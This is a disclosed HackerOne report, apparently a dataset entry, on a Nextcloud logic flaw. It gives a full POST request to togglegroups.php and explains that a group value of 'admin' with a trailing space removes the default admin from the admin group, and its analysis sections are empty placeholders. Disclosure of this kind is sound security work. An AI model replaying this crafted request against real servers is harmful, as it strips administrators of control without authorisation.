---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '145745'
original_report_id: '145745'
title: 'Business/Functional logic bypass: Remove admins from admin group.'
weakness: Privilege Escalation
team_handle: nextcloud
created_at: '2016-06-18T18:48:23.878Z'
disclosed_at: '2016-06-19T12:43:16.017Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
tags:
- hackerone
- privilege-escalation
---

# Business/Functional logic bypass: Remove admins from admin group.

## Metadata

- HackerOne Report ID: 145745
- Weakness: Privilege Escalation
- Program: nextcloud
- Disclosed At: 2016-06-19T12:43:16.017Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

In nextcloud the default admin can not be removed from his admin group. The group toggle request looks like this:

```
POST /nextcloud/index.php/settings/ajax/togglegroups.php HTTP/1.1
Host: 139.59.9.184
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: JQB5F2pqZwh8OUNVRzwVPxdmKCEbJDssbAUcORtfTVM=:bIHyZZPyIV67tsLPsWgrxCInGdOC40f2yD61Qn4HrTw=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Cookie: oc1jzqgvx8b9=e6gprie4u2ffkq83ivm68ccp80; oc_sessionPassphrase=BL2ccA7kLG%2FpxKWf5znZSBLWSvARKK%2Bv3oLuCFyGd8a5SAqPeeBjIaD88AVnwnMS8ompIL7tN45YiZeeODdFHyPBYZrZAavWsHJqMKZdvU3U6eZUW%2FHCGLMd62y6ty7P; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true
Connection: close
Content-Length: 25

username=test&group=test
```

If we use **admin** as the value of username and **admin ** as the value of group ( admin with a trailing space), the admin will be removed from the admin group.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
